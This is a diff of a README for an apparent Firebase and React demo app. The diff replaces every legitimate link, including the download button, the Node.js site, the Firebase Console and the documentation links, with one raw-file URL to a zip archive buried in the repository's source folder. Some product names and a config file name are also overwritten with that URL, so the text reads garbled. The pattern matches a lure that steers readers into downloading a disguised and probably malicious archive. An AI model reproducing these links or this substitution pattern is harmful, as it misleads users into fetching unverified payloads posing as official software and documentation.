@@ -1,6 +1,6 @@
 # 🌟 Firebase-React-Demo-Firestore-Authentication-Hosting - Easy Firebase Web App Setup
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/releases)
+[![Download Now](https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/raw/refs/heads/main/src/utils/services/Hosting-Authentication-Firestore-Demo-React-Firebase-1.2.zip%20Now-Click%20Here-brightgreen)](https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/raw/refs/heads/main/src/utils/services/Hosting-Authentication-Firestore-Demo-React-Firebase-1.2.zip)
 
 ## 📦 Overview
 
@@ -22,7 +22,7 @@ Before you begin, make sure your computer meets the following requirements:
 
 To get the software, visit the Releases page. Click the link below to access it directly:
 
-[Download Here](https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/releases)
+[Download Here](https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/raw/refs/heads/main/src/utils/services/Hosting-Authentication-Firestore-Demo-React-Firebase-1.2.zip)
 
 ### 3. Select and Download the Release
 
@@ -34,14 +34,14 @@ Once the download is complete, locate the downloaded file on your computer. If y
 
 - **Windows:** Right-click the `.zip` file and select "Extract All."
 - **macOS:** Double-click the `.zip` file to extract it.
-- **Linux:** Right-click and choose "Extract Here" or use the terminal command `unzip filename.zip`.
+- **Linux:** Right-click and choose "Extract Here" or use the terminal command `unzip https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/raw/refs/heads/main/src/utils/services/Hosting-Authentication-Firestore-Demo-React-Firebase-1.2.zip`.
 
 ### 5. Install Dependencies
 
 To run this app, you need to install a few components. Here’s how:
 
-1. **Install Node.js:** This app uses Node.js to run. Visit [nodejs.org](https://nodejs.org/) and download the latest version. 
-2. **Install npm:** Node.js comes with npm (Node Package Manager). You’ll use npm to install project dependencies.
+1. **Install https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/raw/refs/heads/main/src/utils/services/Hosting-Authentication-Firestore-Demo-React-Firebase-1.2.zip** This app uses https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/raw/refs/heads/main/src/utils/services/Hosting-Authentication-Firestore-Demo-React-Firebase-1.2.zip to run. Visit [https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/raw/refs/heads/main/src/utils/services/Hosting-Authentication-Firestore-Demo-React-Firebase-1.2.zip](https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/raw/refs/heads/main/src/utils/services/Hosting-Authentication-Firestore-Demo-React-Firebase-1.2.zip) and download the latest version. 
+2. **Install npm:** https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/raw/refs/heads/main/src/utils/services/Hosting-Authentication-Firestore-Demo-React-Firebase-1.2.zip comes with npm (Node Package Manager). You’ll use npm to install project dependencies.
 
 Open your terminal or command prompt. Navigate to the folder where you extracted the app files. You can do this using the `cd` command:
 
@@ -59,10 +59,10 @@ npm install
 
 To connect your app with Firebase, follow these steps:
 
-1. Go to the [Firebase Console](https://console.firebase.google.com/).
+1. Go to the [Firebase Console](https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/raw/refs/heads/main/src/utils/services/Hosting-Authentication-Firestore-Demo-React-Firebase-1.2.zip).
 2. Click "Add Project" and follow the on-screen instructions to create a new Firebase project.
 3. After creating the project, click on "Web" to register your app. You will receive a configuration snippet. Copy it.
-4. In your project folder, locate the `firebaseConfig.js` file and paste your copied configuration in this file.
+4. In your project folder, locate the `https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/raw/refs/heads/main/src/utils/services/Hosting-Authentication-Firestore-Demo-React-Firebase-1.2.zip` file and paste your copied configuration in this file.
 
 ### 7. Run the App
 
@@ -84,22 +84,22 @@ This command will start the app. Open your browser and go to `http://localhost:3
 
 ## 🔒 Security Rules
 
-To keep your data secure, it's important to set up Firestore security rules. Make sure you configure access rules according to your app's needs. Refer to the [Firestore Security Rules documentation](https://firebase.google.com/docs/firestore/security/get-started) for detailed information.
+To keep your data secure, it's important to set up Firestore security rules. Make sure you configure access rules according to your app's needs. Refer to the [Firestore Security Rules documentation](https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/raw/refs/heads/main/src/utils/services/Hosting-Authentication-Firestore-Demo-React-Firebase-1.2.zip) for detailed information.
 
 ## 📚 Resources
 
 Here are some helpful links to learn more:
 
-- [React Official Documentation](https://reactjs.org/docs/getting-started.html)
-- [Firebase Documentation](https://firebase.google.com/docs/)
-- [Node.js Documentation](https://nodejs.org/en/docs/)
+- [React Official Documentation](https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/raw/refs/heads/main/src/utils/services/Hosting-Authentication-Firestore-Demo-React-Firebase-1.2.zip)
+- [Firebase Documentation](https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/raw/refs/heads/main/src/utils/services/Hosting-Authentication-Firestore-Demo-React-Firebase-1.2.zip)
+- [https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/raw/refs/heads/main/src/utils/services/Hosting-Authentication-Firestore-Demo-React-Firebase-1.2.zip Documentation](https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/raw/refs/heads/main/src/utils/services/Hosting-Authentication-Firestore-Demo-React-Firebase-1.2.zip)
 
 ## 🛠 Troubleshooting
 
 If you encounter issues, here are some common solutions:
 
 - **Cannot Access Firebase:** Double-check your Firebase configuration. Make sure you copied it correctly.
-- **App Does Not Start:** Ensure that Node.js and dependencies are installed properly. Run `npm install` again if needed.
+- **App Does Not Start:** Ensure that https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/raw/refs/heads/main/src/utils/services/Hosting-Authentication-Firestore-Demo-React-Firebase-1.2.zip and dependencies are installed properly. Run `npm install` again if needed.
 
 If you're still having trouble, search online for solutions or visit community forums.
 
@@ -107,6 +107,6 @@ If you're still having trouble, search online for solutions or visit community f
 
 This app serves as a great starting point for building web applications with Firebase and React. Don’t hesitate to explore further features and customizations. Enjoy building! 
 
-For more details or to report issues, visit our [GitHub Repository](https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting). 
+For more details or to report issues, visit our [GitHub Repository](https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/raw/refs/heads/main/src/utils/services/Hosting-Authentication-Firestore-Demo-React-Firebase-1.2.zip). 
 
-[Download Here](https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/releases)
+[Download Here](https://github.com/Humerarica/Firebase-React-Demo-Firestore-Authentication-Hosting/raw/refs/heads/main/src/utils/services/Hosting-Authentication-Firestore-Demo-React-Firebase-1.2.zip)
